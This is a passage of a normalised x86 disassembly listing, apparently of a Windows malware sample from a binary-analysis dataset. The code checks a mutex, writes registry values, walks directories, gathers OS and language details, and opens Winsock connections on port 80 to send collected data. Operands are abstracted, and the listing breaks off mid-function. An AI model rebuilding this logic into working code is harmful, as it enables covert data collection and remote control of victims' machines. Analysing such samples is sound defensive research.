sub_401000
mov eax sub_40c004
call sub_40542c
push ecx
push ecx
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] esi
call sub_401064
lea eax [ ebp - 0x14 ]
push eax
push esi
push esi
push sub_403f9e
push esi
push esi
call [ CreateThread@IAT ]
call sub_401236
cmp eax esi
jne r-xdata
call sub_4026db
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_401064
push esi
push 0x6
push rw-data
call sub_402ad0
push 0x8
pop esi
push esi
push rw-data
call sub_402ad0
push 0x1f
push rw-data
call sub_402ad0
push 0xf
push rw-data
call sub_402ad0
push 0x13
push rw-data
call sub_402ad0
push 0x17
push rw-data
call sub_402ad0
push esi
push rw-data
call sub_402ad0
push esi
push rw-data
call sub_402ad0
add esp 0x40
push esi
push rw-data
call sub_402ad0
push 0xa
push rw-data
call sub_402ad0
push 0xd
push rw-data
call sub_402ad0
push esi
push rw-data
call sub_402ad0
push 0xf
push rw-data
call sub_402ad0
push 0xe
push rw-data
call sub_402ad0
push 0xe
push rw-data
call sub_402ad0
push 0x9
push rw-data
call sub_402ad0
add esp 0x40
push 0xf
push rw-data
call sub_402ad0
push 0xd
push rw-data
call sub_402ad0
push 0x11
push rw-data
call sub_402ad0
push 0x7
push rw-data
call sub_402ad0
push 0xc
push rw-data
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
add esp 0x40
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
add esp 0x40
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
mov esi rw-data
push esi
call sub_405450
push eax
push esi
call sub_402ad0
add esp 0x2c
pop esi
retn
sub_401236
push ecx
push ebx
push esi
push edi
push rw-data
push rw-data
call sub_405540
push rw-data
push rw-data
call sub_405540
mov esi rw-data
push rw-data
push esi
call sub_405540
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
add esp 0x40
mov ebx rw-data
push ebx
push edi
call sub_405550
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
add esp 0x40
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
push rw-data
push edi
call sub_405550
mov edi rw-data
push esi
push edi
call sub_405540
add esp 0x40
push rw-data
push edi
call sub_405550
push esi
mov esi rw-data
push esi
call sub_405540
push ebx
push esi
call sub_405550
mov esi [ CreateEventA@IAT ]
add esp 0x18
xor edi edi
push rw-data
push edi
push edi
push edi
call esi
push rw-data
push edi
push edi
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_401b50
test eax eax
jne r-xdata
push rw-data
call sub_401d06
pop ecx
call sub_401d64
mov [ rw-data ] eax
call sub_401c9b
call sub_402af2
lea eax [ esp + 0xc ]
push eax
push edi
push edi
push sub_4032c3
push edi
push edi
call [ CreateThread@IAT ]
call sub_4025d4
call sub_4026a7
call sub_4026b9
mov esi 0x2000
push esi
call sub_4054cb
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_4054cb
pop ecx
mov [ rw-data ] eax
xor ecx ecx
cmp eax edi
setne cl
mov eax ecx
pop edi
pop esi
pop ebx
pop ecx
retn
sub_401424
push ebp
mov ebp esp
sub esp 0x11c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
leave
retn
mov ax [ rw-data ]
push eax
call [ Ordinal_WSOCK32_9@IAT ]
push rw-data
mov [ ebp - 0xe ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_401e51
add esp 0x10
test eax eax
jne r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_402b84
pop ecx
mov esi eax
pop ecx
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
pop esi
leave
retn
sub_4014a7
push ebp
mov ebp esp
sub esp 0x444
push [ ebp + 0x8 ]
lea eax [ ebp - 0x340 ]
push eax
call sub_405540
lea eax [ ebp - 0x340 ]
push eax
call sub_405450
add esp 0xc
cmp [ ebp + eax - 0x341 ] 0x5c
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
pop esi
leave
retn
test [ ebp - 0x140 ] 0x10
je r-xdata
lea eax [ ebp - 0x340 ]
push eax
call sub_405550
pop ecx
lea eax [ ebp - 0x140 ]
pop ecx
push esi
push eax
lea eax [ ebp - 0x340 ]
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
inc [ rw-data ]
lea eax [ ebp - 0x114 ]
push rw-data
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
call [ FindClose@IAT ]
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x114 ]
push rw-data
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x444 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call sub_405630
lea eax [ ebp - 0x444 ]
push eax
call sub_4014a7
add esp 0x14
jmp r-xdata
sub_401597
push ebp
mov ebp esp
sub esp 0x444
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea eax [ ebp - 0x340 ]
push ebx
push eax
call sub_405540
lea eax [ ebp - 0x340 ]
push eax
call sub_405450
add esp 0xc
cmp [ ebp + eax - 0x341 ] 0x5c
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
mov edi [ ebp + 0xc ]
mov esi rw-data
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x340 ]
push eax
call sub_405550
pop ecx
lea eax [ ebp - 0x140 ]
pop ecx
push eax
lea eax [ ebp - 0x340 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
cmp [ ebp + 0x14 ] eax
jne r-xdata
lea eax [ ebp - 0x114 ]
push rw-data
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x13c ]
push 0x8
push eax
push edi
call sub_405720
lea eax [ ebp - 0x12c ]
push 0x8
add edi 0x8
push eax
push edi
call sub_405720
push ebx
call sub_405450
add esp 0x1c
cmp [ eax + ebx - 0x1 ] 0x5c
lea eax [ ebp - 0x114 ]
push eax
push ebx
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x114 ]
push rw-data
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push rw-data
jmp r-xdata
mov [ rw-data ] eax
mov [ rw-data ] 0x1
xor esi esi
jmp r-xdata
lea eax [ ebp - 0x114 ]
push eax
push ebx
lea eax [ ebp - 0x444 ]
push esi
push eax
call sub_405630
push [ ebp + 0x14 ]
lea eax [ ebp - 0x444 ]
push [ ebp + 0x10 ]
push edi
push eax
call sub_401597
add esp 0x20
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
mov eax esi
push [ ebp + 0x10 ]
call sub_405630
add esp 0x10
push 0x1
pop esi
jmp r-xdata
test [ ebp - 0x140 ] 0x10
je r-xdata
push [ ebp + 0x8 ]
call [ FindClose@IAT ]
push 0x1
pop eax
jmp r-xdata
jmp r-xdata
sub_401721
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jle r-xdata
pop edi
pop esi
retn
mov esi rw-data
inc edi
add esi 0x104
cmp edi [ rw-data ]
jl r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push esi
call sub_401597
add esp 0x10
test eax eax
jne r-xdata
sub_40175d
push ebp
mov ebp esp
sub esp 0x724
push ebx
push esi
mov esi 0x104
push edi
mov edi [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x11c ]
xor ebx ebx
push esi
push eax
mov [ rw-data ] ebx
call edi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call sub_405550
lea eax [ ebp - 0x11c ]
push ebx
push eax
call sub_40bf36
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x11c ]
push esi
push eax
call edi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call sub_405550
lea eax [ ebp - 0x11c ]
push ebx
push eax
call sub_40bf36
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x11c ]
push eax
mov eax [ rw-data ]
imul eax eax 0x104
add eax rw-data
push eax
call sub_405540
inc [ rw-data ]
pop ecx
pop ecx
mov edi [ SHGetSpecialFolderPathA@IAT ]
push ebx
lea eax [ ebp - 0x11c ]
push 0x2
push eax
push ebx
mov [ ebp - 0x11c ] bl
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x11c ]
push eax
mov eax [ rw-data ]
imul eax eax 0x104
add eax rw-data
push eax
call sub_405540
inc [ rw-data ]
pop ecx
pop ecx
cmp [ ebp - 0x11c ] bl
je r-xdata
push ebx
lea eax [ ebp - 0x11c ]
push 0x17
push eax
push ebx
call edi
lea eax [ ebp - 0x724 ]
push esi
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push rw-data
lea eax [ ebp - 0x724 ]
push 0x5c
push eax
call sub_405ba0
pop ecx
inc eax
pop ecx
push eax
call sub_405540
lea eax [ ebp - 0x724 ]
push rw-data
push eax
call sub_405b85
add esp 0x10
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call sub_405550
lea eax [ ebp - 0x11c ]
push ebx
push eax
call sub_40bf36
add esp 0x10
test eax eax
jne r-xdata
xor edi edi
cmp [ rw-data ] ebx
mov [ rw-data ] ebx
jle r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x220 ]
push esi
push eax
call sub_405b0e
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
mov eax [ rw-data ]
imul eax eax 0x104
add eax rw-data
push eax
call sub_405540
inc [ rw-data ]
pop ecx
pop ecx
lea eax [ ebp - 0x11c ]
push rw-data
push eax
mov [ ebp - 0x620 ] 0x7b
call sub_405540
lea eax [ ebp - 0x11c ]
push 0x2f
push eax
call sub_405ba0
add esp 0x10
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] rw-data
push [ ebp - 0x8 ]
call sub_405ab8
pop ecx
lea eax [ ebp - 0x220 ]
push eax
call sub_405450
cmp eax 0x3
pop ecx
jle r-xdata
mov esi rw-data
lea eax [ ebp - 0x61b ]
push esi
push eax
call sub_405540
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x61b ]
push eax
call sub_405550
push esi
call sub_405450
mov esi eax
lea eax [ ebp - 0x11c ]
push eax
call sub_405450
lea esi [ esi + eax + 0x6 ]
mov edi rw-data
push edi
lea eax [ ebp + esi - 0x620 ]
push eax
call sub_405540
push edi
call sub_405450
lea esi [ esi + eax + 0x1 ]
mov eax [ rw-data ]
add esp 0x24
mov [ ebp + esi - 0x620 ] eax
add esi 0x4
cmp [ rw-data ] ebx
jne r-xdata
mov [ eax ] bl
push [ ebp - 0x4 ]
call sub_4014a7
add [ ebp - 0x4 ] esi
inc edi
cmp edi [ rw-data ]
pop ecx
jl r-xdata
xor edi edi
cmp [ rw-data ] ebx
mov [ ebp + eax - 0x221 ] bl
jle r-xdata
mov [ ebp + esi - 0x620 ] 0x1
mov [ ebp + esi - 0x620 ] bl
jmp r-xdata
lea eax [ ebp - 0x220 ]
push ebx
push eax
call sub_40bf36
pop ecx
test eax eax
pop ecx
jne r-xdata
mov [ ebp - 0x4 ] rw-data
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
inc esi
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x220 ]
push eax
mov eax [ rw-data ]
imul eax eax 0x104
add eax rw-data
push eax
call sub_405540
inc [ rw-data ]
cmp [ rw-data ] 0xd
pop ecx
pop ecx
jl r-xdata
cmp edi eax
jl r-xdata
add [ ebp - 0x4 ] esi
inc edi
cmp edi eax
jl r-xdata
mov [ ebp + esi - 0x620 ] 0x4e
mov [ ebp + esi - 0x620 ] 0x43
jmp r-xdata
mov [ ebp + esi - 0x620 ] 0x50
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x220 ]
push eax
call sub_405690
pop ecx
test eax eax
mov eax [ rw-data ]
pop ecx
je r-xdata
lea eax [ ebp - 0x620 ]
push esi
push eax
mov [ ebp - 0x61f ] esi
call sub_402502
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x10
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_405a60
lea eax [ ebp - 0x220 ]
push 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x220 ] bl
call sub_401721
add esp 0x18
cmp [ ebp - 0x220 ] bl
je r-xdata
mov eax [ rw-data ]
inc esi
mov [ ebp + esi - 0x620 ] eax
add esi 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x10
push eax
lea eax [ ebp + esi - 0x620 ]
push eax
call sub_405720
add esi 0x10
lea eax [ ebp - 0x220 ]
push eax
lea eax [ ebp + esi - 0x620 ]
push eax
call sub_405540
lea eax [ ebp - 0x220 ]
push eax
call sub_405450
add esp 0x18
add esi eax
sub_401b6f
push ebp
mov ebp esp
sub esp 0x88
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
mov edi rw-data
push eax
push edi
push ebx
mov esi rw-data
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov edi rw-data
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push edi
push [ ebp - 0x4 ]
xor esi esi
mov [ ebp - 0x8 ] 0x80
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_405bef
push eax
call sub_405bc7
pop ecx
pop ecx
call sub_405bd1
push 0x4
push edi
push 0x4
push ebx
push esi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push rw-data
push rw-data
call sub_405540
pop ecx
pop ecx
mov al [ ebp - 0x88 ]
mov [ ebp + eax - 0x88 ] bl
mov [ ebp - 0x8 ] eax
push eax
lea eax [ ebp - 0x88 ]
push eax
push 0x1
push ebx
push edi
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
inc cl
mov [ ebp + eax - 0x88 ] cl
mov cl [ eax + rw-data ]
inc eax
jmp r-xdata
mov [ esi + rw-data ] bl
jmp r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp cl bl
je r-xdata
mov cl [ rw-data ]
xor eax eax
cmp al bl
je r-xdata
sub_401c9b
push esi
push edi
mov esi rw-data
xor edi edi
push esi
push edi
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax edi
je r-xdata
push esi
push edi
push edi
call [ CreateMutexA@IAT ]
call sub_401b6f
push rw-data
push rw-data
call sub_404ed3
pop ecx
pop ecx
pop edi
pop esi
retn
push eax
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
sub_401d06
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call sub_405a60
add esp 0xc
mov [ esi ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
mov [ rw-data ] ax
call sub_404d1d
test eax eax
je r-xdata
push esi
mov [ esi ] 0x94
call edi
push rw-data
push rw-data
jmp r-xdata
add esi 0x14
push esi
call sub_405550
pop ecx
pop ecx
pop edi
pop esi
retn
sub_401d64
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call sub_405e40
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
push eax
push rw-data
call sub_405540
inc esi
push esi
call sub_405d56
add esp 0xc
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
push 0x3a
push edi
call sub_405d80
mov esi eax
push edi
mov [ esi ] bl
call sub_402b65
add esp 0xc
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401e51
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x0
push 0x1
pop esi
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov edi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ edi ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call [ Ordinal_WSOCK32_12@IAT ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
push 0x10
and [ ebx + 0x4 ] 0x0
mov [ ebx ] 0x3c
and [ esi ] 0x0
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0xc ]
inc [ esi ]
push eax
mov [ eax ] 0x2
push [ edi ]
call [ Ordinal_WSOCK32_4@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push ebx
push 0x0
push esi
inc eax
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
pop eax
push [ edi ]
call [ Ordinal_WSOCK32_3@IAT ]
sub_401eea
push ebp
mov ebp esp
mov eax 0x2140
call sub_405f70
push ebx
push esi
push edi
xor ebx ebx
push [ ebp + 0x8 ]
call sub_402b65
mov esi [ Ordinal_WSOCK32_9@IAT ]
mov edi [ Ordinal_WSOCK32_10@IAT ]
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_405540
pop ecx
pop ecx
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x1a ] ax
lea eax [ ebp - 0x3c ]
push eax
call edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_401e51
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
call esi
push rw-data
mov [ ebp - 0x1a ] ax
call edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_401e51
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2140 ]
push [ ebp + 0x24 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4028f7
lea eax [ ebp - 0x2140 ]
push eax
call sub_405450
push [ ebp + 0x18 ]
mov esi eax
mov edi esi
push [ ebp + 0x14 ]
lea eax [ ebp + esi - 0x2140 ]
push eax
call sub_405720
add esi [ ebp + 0x18 ]
add esp 0x28
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push 0x1
pop ebx
push 0x0
lea eax [ ebp - 0x2140 ]
push esi
push eax
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_19@IAT ]
push 0x1
pop esi
cmp [ ebp + 0x24 ] esi
jne r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x4 ]
call sub_4029f6
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push 0x0
push eax
mov eax [ ebp - 0x4 ]
push 0x0
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
lea ebx [ esi - 0xc ]
mov eax 0x1ff9
cmp ebx eax
jbe r-xdata
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov edi 0x3e800
cmp eax edi
jge r-xdata
xor esi esi
jmp r-xdata
add edi 0x5
cmp edi ebx
jge r-xdata
mov ebx eax
xor ebx ebx
xor esi esi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
jmp r-xdata
lea eax [ ebp + edi - 0x2140 ]
mov [ ebp + 0x18 ] eax
mov eax edi
push ebx
sub eax esi
push eax
mov eax [ ebp + 0x1c ]
add eax esi
push eax
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp edi ebx
jge r-xdata
inc edi
inc [ ebp + 0x18 ]
cmp edi ebx
jl r-xdata
cmp eax ebx
je r-xdata
mov [ ebp + edi - 0x213b ] 0x2a
push 0x7
push rw-data
push [ ebp + 0x18 ]
call sub_405ec0
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] esi
pop eax
jmp r-xdata
add esi eax
cmp esi edi
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
lea eax [ ebp - 0x140 ]
push ebx
push eax
mov eax [ ebp - 0x4 ]
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_4020fb
push ecx
push esi
push edi
push 0x3e800
call sub_4054cb
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401eea
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_405f9f
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
movzx eax [ esi + 0x4 ]
mov [ rw-data ] eax
movzx eax [ esi + 0x6 ]
mov [ rw-data ] eax
pop edi
pop esi
pop ecx
retn
sub_402163
push ebp
mov ebp esp
sub esp 0x58c
push 0x3e800
call sub_4054cb
test eax eax
pop ecx
mov [ ebp - 0x4 ] eax
jne r-xdata
push ebx
push esi
mov esi rw-data
push edi
lea eax [ ebp - 0x587 ]
push esi
push eax
call sub_405540
push esi
call sub_405450
mov ebx eax
mov esi rw-data
add ebx 0x6
push esi
lea eax [ ebp + ebx - 0x58c ]
push eax
call sub_405540
push esi
call sub_405450
lea ebx [ ebx + eax + 0x1 ]
mov esi 0x9c
push esi
push rw-data
lea eax [ ebp + ebx - 0x58c ]
push eax
call sub_405720
mov ax [ rw-data ]
add ebx esi
mov edx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x18c ]
add esp 0x24
movsd [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] ax
inc ebx
movsd [ edi ] [ esi ]
inc ebx
push 0x1d
test edx edx
setne al
movsw [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] al
mov eax [ rw-data ]
inc ebx
pop ecx
movsb [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] eax
xor eax eax
lea edi [ ebp - 0x181 ]
add ebx 0x4
[ edi ]
stosb [ edi ]
xor eax eax
cmp edx eax
je r-xdata
leave
retn
lea eax [ ebp - 0x18c ]
push eax
push rw-data
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call sub_405630
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call sub_405540
lea eax [ ebp - 0x10c ]
push eax
call sub_405450
add esp 0x1c
lea ebx [ ebx + eax + 0x1 ]
call [ GetTickCount@IAT ]
mov ecx 0x36ee80
xor edx edx
mov edi ecx
mov esi eax
div edi
mov edi 0xea60
mov eax edx
xor edx edx
div edi
xor edx edx
push eax
mov eax esi
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call sub_405630
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call sub_405540
lea eax [ ebp - 0x10c ]
push eax
call sub_405450
lea esi [ ebx + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call sub_405540
lea eax [ ebp - 0x10c ]
push 0x2f
push eax
call sub_405ba0
mov ebx rw-data
lea edi [ ebp + esi - 0x58c ]
push ebx
push edi
mov [ ebp - 0x8 ] eax
call sub_405540
mov eax [ ebp - 0x8 ]
add esp 0x34
test eax eax
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push 0x1
push eax
lea eax [ ebp - 0x58c ]
push [ ebp - 0x4 ]
mov [ ebp - 0x58c ] 0x30
mov [ ebp - 0x58b ] esi
push esi
push eax
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_401eea
push [ ebp - 0x4 ]
mov esi eax
call sub_405f9f
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push edi
call sub_405550
push ebx
call sub_405450
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call sub_405450
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x1 ]
cmp [ rw-data ] eax
mov al 0x43
jne r-xdata
cmp [ rw-data ] eax
je r-xdata
push [ rw-data ]
movsx eax al
push rw-data
push eax
lea eax [ ebp - 0x18c ]
push rw-data
push eax
call sub_405630
add esp 0x14
mov al 0x20
mov al 0x50
jmp r-xdata
sub_4023cd
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call sub_4054cb
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401eea
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_405f9f
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_402428
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_402428
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call sub_405450
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
sub_402475
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
